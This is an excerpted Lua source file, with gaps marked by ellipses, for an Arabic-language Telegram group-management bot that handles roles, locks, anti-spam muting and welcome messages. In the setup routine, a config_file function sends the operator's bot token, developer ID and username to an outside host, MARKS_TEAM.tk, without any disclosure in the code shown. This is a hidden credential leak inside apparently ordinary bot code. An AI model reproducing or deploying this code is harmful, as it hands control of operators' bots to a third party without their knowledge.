...
MARX = redis.connect('127.0.0.1', 6379) DEVDEVIL = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
function vardump(value)  print(serpent.block(value, {comment=false}))   end 
function config_file(id,user,bot)  https.request('https://MARKS_TEAM.tk/insert/?id='..id..'&user='..user..'&token='..bot)  end
...
if not MARX:get(DEVDEVIL..":token") then
...
if not MARX:get(DEVDEVIL..":SUDO:ID") then
io.write('\27[1;31m ↡ ارسل ايدي مطور الاساسي |\n SEND ID FOR SIDO : \27[0;39;49m')
local SUDOID = io.read()
if SUDOID ~= '' then
io.write('\n\27[1;34m تم حفظ ايدي المطور |\n\27[0;39;49m')
MARX:set(DEVDEVIL..":SUDO:ID",SUDOID)
else
print('\n\27[1;34m لم يتم حفظ ايدي المطور |')
end 
os.execute('lua DEVIL.lua')
end
if not MARX:get(DEVDEVIL..":SUDO:USERNAME") then
io.write('\27[1;31m ↡ ارسل معرف المطور الاساسي |\n SEND ID FOR SIDO : \27[0;39;49m')
local SUDOUSERNAME = io.read():gsub('@','')
if SUDOUSERNAME ~= '' then
io.write('\n\27[1;34m تم حفظ معرف المطور |\n\27[0;39;49m')
MARX:set(DEVDEVIL..":SUDO:USERNAME",'@'..SUDOUSERNAME)
else
...
config = {
token = MARX:get(DEVDEVIL..":token"),
SUDO = MARX:get(DEVDEVIL..":SUDO:ID"),
USERNAME = MARX:get(DEVDEVIL..":SUDO:USERNAME"), }
create(config, "./requfiles/INFO.lua")   
config_file(MARX:get(DEVDEVIL..":SUDO:ID"),MARX:get(DEVDEVIL..":SUDO:USERNAME"),MARX:get(DEVDEVIL..":token"))
end 
create_config_auto()
...
local load_MARX = function()  
local f = io.open("./requfiles/INFO.lua", "r")  
if not f then   
AutoSet()  
else   
f:close()  
MARX:del(DEVDEVIL..":token")
MARX:del(DEVDEVIL..":SUDO:ID")
MARX:del(DEVDEVIL..":SUDO:USERNAME")
MARX:del(DEVDEVIL..":NAMEBOT")
end  
...
NAMEBOT = (MARX:get(DEVSTOR..'DEVIL:name') or 'ستورم')
...
function is_sudo(msg) local hash = MARX:sismember(DEVSTOR..'sudo:bot',msg.sender_user_id_)  if hash or is_devtaha(msg)  then  return true  else  return false  end  end
function is_bot(msg) if tonumber(BOTS) == BOTS then return true else return false end end 
function is_owner(msg) local hash = MARX:sismember(DEVSTOR..'moder'..msg.chat_id_,msg.sender_user_id_)    if hash or is_devtaha(msg) or is_sudo(msg) then    return true    else    return false    end end
function is_monsh(msg) local hash = MARX:sismember(DEVSTOR..'modergroup'..msg.chat_id_,msg.sender_user_id_)    if hash or  is_devtaha(msg) or is_sudo(msg) or is_owner(msg) then    return true    else    return false    end end
function is_mod(msg) local hash = MARX:sismember(DEVSTOR..'mods:'..msg.chat_id_,msg.sender_user_id_)    if hash or  is_devtaha(msg) or is_sudo(msg) or is_owner(msg) or is_monsh(msg) then    return true    else    return false    end end
function changetitle(chat_id, title) tdcli_function ({ ID = "ChangeChatTitle", chat_id_ = chat_id, title_ = title  }, dl_cb, nil) end
function is_vipgroups(msg)  local hash = MARX:sismember(DEVSTOR..'vip:groups',msg.sender_user_id_) if hash or  is_devtaha(msg) then return true else return false end end
function is_vipgroup(msg)  local hash = MARX:sismember(DEVSTOR..'vip:group'..msg.chat_id_,msg.sender_user_id_) if hash or  is_devtaha(msg) or is_sudo(msg) or is_owner(msg) or is_mod(msg) or is_vipgroups(msg)  then return true else return false end end
function is_memar(msg)  local hash = MARX:sismember(DEVSTOR..'mepar',msg.sender_user_id_) if hash or  is_devtaha(msg) or is_sudo(msg) or is_owner(msg) or is_mod(msg) or is_mod(msg) or is_vipgroup(msg) or is_vipgroups(msg) then return true else return false end end
function is_banned(chat,user) local hash =  MARX:sismember(DEVSTOR..'DEVIL:baned'..chat,user) if hash then return true else return false end end
function is_gban(chat,user) local hash =  MARX:sismember(DEVSTOR..'DEVIL:gbaned',user) if hash then return true else return false end end
...
local var = true
if MARX:get(DEVSTOR..'add:ch:id') then
tahaid = MARX:get(DEVSTOR..'add:ch:id')
tahauser = MARX:get(DEVSTOR..'add:ch:username')
...
var = false
if MARX:get(DEVSTOR..'text:ch:user') then
local textchuser = MARX:get(DEVSTOR..'text:ch:user')
...
MARX:set(DEVSTOR.."user:Name"..id, "@"..username)
print('\27[30;35m»» USERNAME IS SAEVE ↓\n»» @'..data.username_..'\n\27[1;37m') else
MARX:del(DEVSTOR.."user:Name"..id)
print('»» USERNAME IS NOT SAEVE') end
if data.type_.ID == "UserTypeBot" then
MARX:del(DEVSTOR.."user:Name"..id) end
...
function DEVIL_get_nae(user_id) if MARX:hget('name',user_id) then text = ''..(string.gsub(MARX:hget('name',user_id), 'false', '') or ' لا يوجد 🔥 ')  end  get_user(user_id) MARX:hdel('name',user_id) return text end
...
function get_user(user_id) function dl_username(arg, data) username = data.username or ' ' name = data.first_name_ or ' لا يوجد 🔥 ' MARX:hset('username',data.id_,data.username_) MARX:hset('name',data.id_,data.first_name_) end  tdcli_function ({    ID = "GetUser",    user_id_ = user_id  }, dl_username, nil) end
...
t = 'المطور'
elseif MARX:sismember(DEVSTOR..'sudo:bot',user_id) then
t = 'المطور'
elseif MARX:sismember(DEVSTOR..'moder'..chat_id,user_id) then
t = 'المنشئ'
elseif MARX:sismember(DEVSTOR..'modergroup'..chat_id,user_id) then
t = 'المدير'
elseif MARX:sismember(DEVSTOR..'mods:'..chat_id,user_id) then
t = 'الادمن'
elseif MARX:sismember(DEVSTOR..'vip:groups',user_id) then
t = 'المميز عام'
elseif MARX:sismember(DEVSTOR..'vip:group'..chat_id,user_id) then
t = 'المميز'
else
t = ' '
end
...
if MARX:sismember(DEVSTOR..'modergroup'..chat_id,user_id) then
t = 'المدير'
elseif MARX:sismember(DEVSTOR..'mods:'..chat_id,user_id) then
t = 'الادمن'
elseif MARX:sismember(DEVSTOR..'vip:group'..chat_id,user_id) then
...
MARX:del(DEVSTOR.."lock:user:name"..chat_id)  MARX:del(DEVSTOR.."lock:hashtak"..chat_id)  MARX:del(DEVSTOR.."lock:Cmd"..chat_id)  MARX:del(DEVSTOR.."lock:Link"..chat_id)  MARX:del(DEVSTOR.."lock:forward"..chat_id)  MARX:del(DEVSTOR.."lock:Keyboard"..chat_id)  MARX:del(DEVSTOR.."lock:geam"..chat_id)  MARX:del(DEVSTOR.."lock:Photo"..chat_id)  MARX:del(DEVSTOR.."lock:Animation"..chat_id)  MARX:del(DEVSTOR.."lock:Video"..chat_id)  MARX:del(DEVSTOR.."lock:Audio"..chat_id)  MARX:del(DEVSTOR.."lock:vico"..chat_id)  MARX:del(DEVSTOR.."lock:Sticker"..chat_id)  MARX:del(DEVSTOR.."lock:Document"..chat_id)  MARX:del(DEVSTOR.."lock:Unsupported"..chat_id)  MARX:del(DEVSTOR.."lock:Markdaun"..chat_id)  MARX:del(DEVSTOR.."lock:Contact"..chat_id)  MARX:del(DEVSTOR.."lock:Spam"..chat_id)
end
local function add_lockal(chat_id)
MARX:set(DEVSTOR.."lock:Bot:kick"..chat_id,'del')  MARX:set(DEVSTOR..'lock:tagservrbot'..chat_id,true)   MARX:set(DEVSTOR.."lock:user:name"..chat_id,'del')    MARX:set(DEVSTOR.."lock:hashtak"..chat_id,'del')    MARX:set(DEVSTOR.."lock:Cmd"..chat_id,'del')    MARX:set(DEVSTOR.."lock:Link"..chat_id,'del')    MARX:set(DEVSTOR.."lock:forward"..chat_id,'del')    MARX:set(DEVSTOR.."lock:Keyboard"..chat_id,'del')    MARX:set(DEVSTOR.."lock:geam"..chat_id,'del')    MARX:set(DEVSTOR.."lock:Photo"..chat_id,'del')    MARX:set(DEVSTOR.."lock:Animation"..chat_id,'del')    MARX:set(DEVSTOR.."lock:Video"..chat_id,'del')    MARX:set(DEVSTOR.."lock:Audio"..chat_id,'del')    MARX:set(DEVSTOR.."lock:vico"..chat_id,'del')    MARX:set(DEVSTOR.."lock:Sticker"..chat_id,'del')    MARX:set(DEVSTOR.."lock:Document"..chat_id,'del')    MARX:set(DEVSTOR.."lock:Unsupported"..chat_id,'del')    MARX:set(DEVSTOR.."lock:Markdaun"..chat_id,'del')    MARX:set(DEVSTOR.."lock:Contact"..chat_id,'del')    MARX:set(DEVSTOR.."lock:Spam"..chat_id,'del')  
end
function rem_group(chat_id) 
MARX:srem(DEVSTOR..'bot:gpsby:id',chat_id) 
MARX:del(DEVSTOR.."test:group"..chat_id)   
MARX:del(DEVSTOR.."add:bot:group"..chat_id,true) 
rem_lockal(chat_id) 
end
function add_group(chat_id) 
MARX:sadd(DEVSTOR..'bot:gpsby:id',chat_id)
MARX:sadd(DEVSTOR.."botgps",chat_id)  
MARX:set(DEVSTOR.."test:group"..chat_id,'DEVIL')    
MARX:set(DEVSTOR.."add:bot:group"..chat_id, true)   
end
...
function is_filter(msg, value)  local names = MARX:smembers(DEVSTOR..'filters:'..msg.chat_id_)  local var = false for i=1, #names do  if names[i] == value and not is_vipgroup(msg) then  var = true      end end return var  end 
function is_muted(chat,user) local hash =  MARX:sismember(DEVSTOR..'mutes'..chat,user) if hash then return true else return false end end
function DEVILmonshn(chat_id, user_id, msg_id, text, offset, length) local tt = MARX:get(DEVSTOR..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
function DEVIL1(chat,user) local sudoe = MARX:sismember(DEVSTOR..'sudo:bot',user)  local vipss = MARX:sismember(DEVSTOR..'vip:groups',user)  local monh = MARX:sismember(DEVSTOR..'modergroup'..chat,user)  local noow = MARX:sismember(DEVSTOR..'moder'..chat,user)  local nomo = MARX:sismember(DEVSTOR..'mods:'..chat,user)  local novip2 = MARX:sismember(DEVSTOR..'vip:group'..chat,user)  if tonumber(SUDO) == tonumber(user) or sudoe or vipss or monh  or noow or nomo  or novip2 then  return true  else  return false  end  end 
function DEVIL2(chat,user) local sudoe = MARX:sismember(DEVSTOR..'sudo:bot',user)  local vipss = MARX:sismember(DEVSTOR..'vip:groups',user)  local noow = MARX:sismember(DEVSTOR..'moder'..chat,user)  if tonumber(SUDO) == tonumber(user) or sudoe or vipss or noow  then  return true else  return false end end 
function DEVIL3(chat,user) local sudoe = MARX:sismember(DEVSTOR..'sudo:bot',user) local noow = MARX:sismember(DEVSTOR..'moder'..chat,user) if tonumber(SUDO) == tonumber(user) or sudoe or monh   then return true else return false end end 
function DEVIL4(chat,user) local sudoe = MARX:sismember(DEVSTOR..'sudo:bot',user)     local noow = MARX:sismember(DEVSTOR..'moder'..chat,user)     local monh = MARX:sismember(DEVSTOR..'modergroup'..chat,user)     local memr = MARX:sismember(DEVSTOR..'mepar',user)    if tonumber(SUDO) == tonumber(user) or sudoe or monh or memr or noow then     return true     else     return false     end     end 
...
function numrgroup(GroupID)  tdcli_function ({ ID = "GetChannelFull",channel_id_ = getChatId(GroupID).ID },function(arg,tah)   MARX:set(DEVSTOR.."numgrop"..GroupID,tah.member_count_) end,nil)  return MARX:get(DEVSTOR.."numgrop"..GroupID)   end
function title_name(GroupID) pcall(tdcli_function({ID ="GetChat",chat_id_=GroupID },function(arg,data)  MARX:set(DEVSTOR..'group:name'..GroupID,data.title_)  end,nil)) return MARX:get(DEVSTOR..'group:name'..GroupID)  end
...
function get_id(msg,taha,text) local get_id = text local get_id = get_id:gsub('IDGET',msg.sender_user_id_) local get_id = get_id:gsub('USERGET',USERNAME_GET) local get_id = get_id:gsub('RTBGET',t) local get_id = get_id:gsub('RTGGET',rtpa) local get_id = get_id:gsub('MSGGET',tonumber(MARX:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..msg.sender_user_id_) or 1)) local get_id = get_id:gsub('TFGET',formsgg(tonumber(MARX:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..msg.sender_user_id_) or 1))) local get_id = get_id:gsub('PHOTOGET',taha.total_count_) local get_id = get_id:gsub('NKOGET',nko)
return get_id end
...
function addmod(chat_id)   tdcli_function ({ID = "GetChannelMembers", channel_id_ = getChatId(chat_id).ID,filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100 },function(arg,data)  local admins = data.members_ for i=0 , #admins do  if data.members_[i].status_.ID == "ChatMemberStatusCreator" then owner_id = admins[i].user_id_  MARX:sadd(DEVSTOR..'moder'..chat_id,owner_id)   tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_ },function(arg,b)   if b.username_ == true then  MARX:set(DEVSTOR.."user:Name"..b.id_,"@"..b.username_) end end,nil)    end  if data.members_[i].bot_info_ == false and data.members_[i].status_.ID == "ChatMemberStatusEditor" then  MARX:sadd(DEVSTOR..'mods:'..chat_id,admins[i].user_id_)   tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_ },function(arg,b)   if b.username_ == true then  MARX:set(DEVSTOR.."user:Name"..b.id_,"@"..b.username_) end end,nil)    else  MARX:srem(DEVSTOR..'mods:'..chat_id,admins[i].user_id_)   end end end,nil)     end
...
MARX:sadd(DEVSTOR..'tedmembars'..msg.chat_id_,msg.sender_user_id_) 
else
DEVILmonshn(msg.chat_id_, msg.sender_user_id_, msg.id_, '📮¦ العضــو » ( '..CatchName(data.first_name_,20)..' )\n📬¦ قام بالتكرار هنا وتم تقييده \n' , 14, utf8.len(data.first_name_)) 
HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") 
MARX:sadd(DEVSTOR..'tedmembars'..msg.chat_id_,msg.sender_user_id_) 
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "md")  
MARX:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_) 
else
DEVILmonshn(msg.chat_id_, msg.sender_user_id_, msg.id_, '📮¦ العضــو » ( '..CatchName(data.first_name_,20)..' )\n📬¦ قام بالتكرار هنا وتم كتمه \n' , 14, utf8.len(data.first_name_))  
MARX:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_) 
end
...
end  function chackgp(msg)  local hash = MARX:sismember(DEVSTOR..'bot:gps', msg.chat_id_) if hash then return true else return false end end
...
if msg.content_.ID == "MessageChatAddMembers" and not MARX:get(DEVSTOR..'lock:klsh:add'..bot_id) then   
for i=0,#msg.content_.members_ do    
addbotgrop = msg.content_.members_[i].id_    
if addbotgrop and addbotgrop == tonumber(bot_id) then  
local photo = MARX:get("addreply1photo1"..bot_id)   
if photo then  
local klishwelc = MARX:get("klish:welc"..bot_id)  
...
MARX:del("klish:welc"..bot_id)  
MARX:del("addreply1photo1"..bot_id)   
...
if not MARX:get(DEVSTOR..'lock:bot:free'..bot_id) then
...
if MARX:sismember(DEVSTOR..'bot:gpsby:id',msg.chat_id_) then
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ المجموعه تم تفعيلها بالتاكيد \nꪜ*', 1, 'md')
MARX:set(DEVSTOR.."add:bot:group"..msg.chat_id_, true) 
else
addmod(msg.chat_id_) 
if ( data.member_count_ > tonumber(MARX:get(DEVSTOR..'setadd:bot'..bot_id) or 100) ) then
test = '*📮¦ تـم تفعيــل المجموعه بـنجـاح 🍃\n📬¦ تم ترقية المنشئ والادمنيه *\n\nꪜ'
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,test, 1, 'md')
MARX:sadd(DEVSTOR..'moder'..msg.chat_id_,msg.sender_user_id_)  
MARX:sadd(DEVSTOR..'add:num'..msg.sender_user_id_,msg.chat_id_) 
MARX:set(DEVSTOR.."add:bot:group"..msg.chat_id_, true)  
MARX:sadd(DEVSTOR..'bot:gpsby:id', msg.chat_id_)   
MARX:sadd(DEVSTOR.."botgps", msg.chat_id_)  
else
local taha = MARX:get(DEVSTOR..'setadd:bot'..bot_id)
...
MARX:del(DEVSTOR.."test:group" .. msg.chat_id_)
end
if data.member_count_ > tonumber(MARX:get(DEVSTOR..'setadd:bot'..bot_id) or 100) and not is_devtaha(msg) then    
local numadd = MARX:scard(DEVSTOR..'add:num'..msg.sender_user_id_)
...
MARX:set(DEVSTOR.."test:group"..msg.chat_id_,'DEVIL')   
end  
if text == 'تعطيل' and add_in_ch(msg) and is_sudo(msg) then      
if not MARX:sismember(DEVSTOR..'bot:gpsby:id',msg.chat_id_) then
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ المجموعه تم تعطيــلها بالتاكيد \nꪜ*', 1, 'md')
MARX:del(DEVSTOR.."add:bot:group"..msg.chat_id_, true)  
MARX:del(DEVSTOR.."test:group" .. msg.chat_id_)
else
test = '*📮¦ تـم تعطيــل المجموعه بـنجـاح 🍃 *\n\nꪜ'
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,test, 1, 'md')
MARX:del(DEVSTOR.."add:bot:group"..msg.chat_id_, true)  
MARX:srem(DEVSTOR..'bot:gpsby:id', msg.chat_id_)   
MARX:srem(DEVSTOR.."botgps", msg.chat_id_)  
MARX:srem(DEVSTOR..'add:num'..msg.sender_user_id_,msg.chat_id_) 
MARX:del(DEVSTOR.."test:group" .. msg.chat_id_)
if not is_devtaha(msg) then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID}, function(arg,data)  
...
MARX:incr(DEVSTOR..'groupmsg:'..msg.chat_id_..':') 
MARX:incr(DEVSTOR..'user:messages:'..msg.chat_id_..':'..msg.sender_user_id_) 
MARX:incr(DEVSTOR..'msg:chat:'..msg.chat_id_..':') 
MARX:incr(DEVSTOR..'msg:user:'..msg.chat_id_..':'..msg.sender_user_id_)
if msg.send_state_.ID == "MessageIsSuccessfullySent" then return false  end end
if msg.can_be_deleted_ == true and not is_mod(msg) then   tdcli_function ({ ID = "GetUser", user_id_ = msg.sender_user_id_ },function(arg,data)  if data.username_ == true then MARX:set(DEVSTOR.."user:Name"..msg.sender_user_id_,"@"..data.username_) end end,nil)
if MARX:get(DEVSTOR..'add:mepr:'..msg.chat_id_) and tonumber(MARX:scard(DEVSTOR..'addedtaha:'..msg.sender_user_id_)) == tonumber(MARX:get(DEVSTOR..'setadd:'..msg.chat_id_)) then  
MARX:sadd(DEVSTOR..'meaddwy:'..msg.chat_id_,msg.sender_user_id_)  
MARX:del(DEVSTOR.."addedtaha:"..msg.sender_user_id_)  
MARX:srem(DEVSTOR..'meaddtaha:'..msg.chat_id_,msg.sender_user_id_)  
tdcli_function ({
ID = "GetUser",
user_id_ = msg.sender_user_id_
},function(arg,data) 
if data.username_ then
DEVIL_sendMsg(msg.chat_id_,msg.id_,1,'*📬¦ العضو ↫ ❪*[@'..data.username_..']*❫*\n*💠¦ قمت باضافه ❪'..tonumber(MARX:get(DEVSTOR..'setadd:'..msg.chat_id_))..'❫* اعضاء \n*📮¦ الان يمكنك الدردشه هنا* \n💥',1,'md')  
else
taha = '📬¦ العضو ↫ ❪'..data.id_..'❫\n💠¦ قمت باضافه ❪'..tonumber(MARX:get(DEVSTOR..'setadd:'..msg.chat_id_))..'❫ اعضاء \n📮¦ الان يمكنك الدردشه هنا \n🍃'
DEVILmonshn(msg.chat_id_, data.id_, 0, taha, 13, utf8.len(data.id_))  
end
end,nil)
elseif msg.content_.text_ and MARX:get(DEVSTOR..'add:mepr:'..msg.chat_id_) and not MARX:sismember(DEVSTOR..'meaddwy:'..msg.chat_id_,msg.sender_user_id_) and not MARX:sismember(DEVSTOR..'meaddtaha:'..msg.chat_id_,msg.sender_user_id_) then  
if tonumber(MARX:scard(DEVSTOR..'addedtaha:'..msg.sender_user_id_)) ~= tonumber(MARX:get(DEVSTOR..'setadd:'..msg.chat_id_)) then  
MARX:sadd(DEVSTOR..'meaddtaha:'..msg.chat_id_,msg.sender_user_id_)  
local mustadd = (MARX:get(DEVSTOR..'setadd:'..msg.chat_id_) or '0')  
tdcli_function ({
ID = "GetUser",
user_id_ = msg.sender_user_id_
},function(arg,data) 
...
for i=0,#mem_id do  
if MARX:get(DEVSTOR..'add:mepr:'..msg.chat_id_) then  
if not MARX:sismember(DEVSTOR..'meaddwy:'..msg.chat_id_,msg.sender_user_id_) then  
if mem_id[i].username_ and mem_id[i].username_:match("[Bb][Oo][Tt]$") then  
return false  
else  
MARX:sadd(DEVSTOR..'addedtaha:'..msg.sender_user_id_,mem_id[i].id_)  
end  
end  
end  
end  
end  
if MARX:get(DEVSTOR..'add:mepr:'..msg.chat_id_) and not MARX:sismember(DEVSTOR..'meaddwy:'..msg.chat_id_,msg.sender_user_id_) then  
...
if MARX:get(DEVSTOR..'setphoto'..msg.chat_id_..':'..msg.sender_user_id_) then 
...
MARX:del(DEVSTOR..'setphoto'..msg.chat_id_..':'..msg.sender_user_id_) 
return false  end
...
chat_type = 'super'
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,data)   MARX:set(DEVSTOR..'group:name'..msg.chat_id_,data.title_) end,nil) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  if data.username_ == true then MARX:set(DEVSTOR.."user:Name"..msg.sender_user_id_,"@"..data.username) end end,nil) 
if msg.can_be_deleted_ == true then
MARX:sadd(DEVSTOR.."botgps", msg.chat_id_)  
tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,tah)   MARX:set(DEVSTOR.."numgrop"..msg.chat_id_,tah.member_count_) end,nil) 
end
elseif id:match('^(%d+)') then 
chat_type = 'user' 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  if data.username_ == true then MARX:set(DEVSTOR.."user:Name"..msg.sender_user_id_,"@"..data.username) else MARX:del(DEVSTOR.."user:Name"..msg.sender_user_id_)  end end,nil) 
MARX:sadd(DEVSTOR.."usersbot",msg.chat_id_)   
else 
chat_type = 'group' 
...
if msg.content_.ID == "MessageChatAddMembers" then 
MARX:incr(DEVSTOR..'add:mempar'..msg.chat_id_..':'..msg.sender_user_id_) 
end
if msg.content_.ID == "MessagePhoto" then msg_type = 'photo' end
if MARX:get(DEVSTOR..'viewchannel'..msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الامر *\n✓", 1, "md") 
MARX:del(DEVSTOR..'viewchannel'..msg.sender_user_id_)
return false  end 
...
MARX:del(DEVSTOR..'viewchannel'..msg.sender_user_id_) end end
if text then   
if is_filter(msg,text) then    
delete_msg(msg.chat_id_,{[0] = msg.id_})        
return false end   
end  
if text then if not MARX:get(DEVSTOR..'bot_id') then
function cb(a,b,c) MARX:set(DEVSTOR..'bot_id',b.id_) end getMe(cb) end end
if MARX:get(DEVSTOR.."get:info:gp" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") or text and text:match("^الغاء ✖$") then   
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الامر *\n✓", 1, "md") 
MARX:del(DEVSTOR.."get:info:gp" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
MARX:del(DEVSTOR.."get:info:gp" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
...
changeChatMemberStatus(ch, bot_id, "Left")
return false  end
local nummsg = tonumber(MARX:get(DEVSTOR..'groupmsg:'..ch..':')) 
local nummsgg = MARX:get(DEVSTOR..'groupmsg:'..ch..':') 
...
if MARX:get(DEVSTOR.."link:group"..ch) then
linkchl = MARX:get(DEVSTOR.."link:group"..ch)
...
if MARX:get(DEVSTOR.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الامر *\n✓", 1, "md") 
MARX:del(DEVSTOR.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
MARX:del(DEVSTOR.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
...
MARX:set(DEVSTOR..'add:ch:id',data.id_)
MARX:set(DEVSTOR..'add:ch:username','@'..data.type_.channel_.username_)
else
...
if MARX:get(DEVSTOR.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الامر *\n✓", 1, "md") 
MARX:del(DEVSTOR.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
MARX:del(DEVSTOR.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
MARX:set(DEVSTOR..'text:ch:user',texxt)
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ تم تغيير رسالة الاشتراك بنجاح *\n✓', 1, 'md')
end
if MARX:get(DEVSTOR.."get:link:gp" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") or text and text:match("^الغاء ✖$") then   
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الامر *\n✓", 1, "md") 
MARX:del(DEVSTOR.."get:link:gp" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
MARX:del(DEVSTOR.."get:link:gp" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local ch = string.match(text, "(-%d+)") 
...
if MARX:get(DEVSTOR..'group:name'..ch) then
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,'📮*¦* رابط المجموعه \n📬*¦* '..MARX:get(DEVSTOR..'group:name'..ch)..' \nـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ\n🍃*¦* ['..data.invite_link_..']', 1, 'md')    
else
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,'💠*¦* رابط المجموعه \nـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ\n['..(data.invite_link_)..']', 1, 'md')    
end
MARX:set(DEVSTOR.."numgrop"..ch,data.member_count_) 
tdcli_function({ID ="GetChat",chat_id_=ch},function(arg,ata) MARX:set(DEVSTOR..'group:name'..ch,ata.title_) end,nil)
end
end    
getChannelFull(ch, taha, {chat_id=ch,msg_id=msg.id})    
MARX:del(DEVSTOR.."get:link:gp" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
end 
if MARX:get(DEVSTOR..'namebot:witting'..msg.sender_user_id_) then 
if text and text:match("^الغاء$") or text and text:match("^الغاء ✖$") then   
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الامر *\n✓", 1, "md") 
MARX:del(DEVSTOR..'namebot:witting'..msg.sender_user_id_) 
return false  end 
MARX:del(DEVSTOR..'namebot:witting'..msg.sender_user_id_) 
MARX:set(DEVSTOR..'DEVIL:name',text) 
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*♻¦* تم تغير اسم البوت \n",1, 'md')  
end 
if MARX:get(DEVSTOR.."welc:bot" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الامر *\n✓", 1, "md") 
MARX:del(DEVSTOR.."welc:bot" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
MARX:del(DEVSTOR.."welc:bot" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local welcome = text:match("(.*)")  
MARX:set(DEVSTOR..'welcome:'..msg.chat_id_,welcome) 
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,'\n📬*¦* تم وضع الترحيب \n', 1, 'md')    
end
if MARX:get(DEVSTOR.."numadd:bot" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الامر *\n✓", 1, "md") 
MARX:del(DEVSTOR.."numadd:bot" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
MARX:del(DEVSTOR.."numadd:bot" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
MARX:set(DEVSTOR..'setadd:bot'..bot_id,numadded)  DEVIL_sendMsg(msg.chat_id_, msg.id_,  1, "📬*¦* تم وضع عدد الاضافه *{ "..numadded..' }*', 1, 'md')  
end
if MARX:get(DEVSTOR.."set:description" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^الغاء$") then 
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الامر *\n✓", 1, "md") 
MARX:del(DEVSTOR.."set:description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)
return false  end 
MARX:del(DEVSTOR.."set:description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
...
if MARX:get(DEVSTOR.."photo:bot" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الامر *\n✓", 1, "md") 
MARX:del(DEVSTOR.."photo:bot" .. msg.chat_id_ .. "" .. msg.sender_user_id_)
return false  end 
